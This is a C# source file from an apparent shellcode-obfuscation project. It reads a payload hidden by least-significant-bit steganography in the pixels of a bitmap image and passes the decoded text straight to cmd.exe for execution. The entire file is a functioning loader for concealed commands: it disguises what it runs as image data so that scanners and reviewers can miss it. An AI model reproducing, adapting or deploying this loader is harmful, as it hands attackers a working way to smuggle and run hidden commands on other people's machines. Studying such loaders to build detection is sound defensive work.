﻿using System;
using System.IO;
using System.Drawing;
using System.Threading;
using System.Diagnostics;

using System.CodeDom;
using System.CodeDom.Compiler;


namespace csharp
{
    class Reader
    {
        const int shellcode_len = 46064;
        static byte[] payload_data = new byte[shellcode_len / 8];

        static void Main(string[] args)
        {
            read_image("C:\\Users\\Blackberry\\Desktop\\projects\\yet-another-shellcode-obfuscator\\samples\\cmd\\powershell.bmp");
            run();
            Thread.Sleep(3000);
        }

        static void read_image(string filename)
        {
            Bitmap bm = new Bitmap(filename);

            int length = shellcode_len;
            int pos = 0;
			
            for (int i = 0; i < bm.Height; i++)
            {
                for (int j = 0; j < bm.Width; j++)
                {
                    Color pixel_color = bm.GetPixel(j, i);

                    byte[] channels = { 
                        pixel_color.R,
                        pixel_color.G,
                        pixel_color.B
                    };

                    foreach (byte channel in channels)
                    {
                        if (length <= 0)
                        {
                            return;
                        }

                        payload_data[pos / 8] = get_lsb(payload_data[pos / 8], channel);
                        pos++;
                        length--;
                    }
                }
            }
        }


        static byte get_lsb(byte target, byte source)
        {
            return (byte)((target << 1) | (source & 1));
        }


        static void run() {
            string args = "/c " + System.Text.Encoding.UTF8.GetString(payload_data, 0, payload_data.Length);
            Process.Start("cmd.exe", args);
        }
    }
}
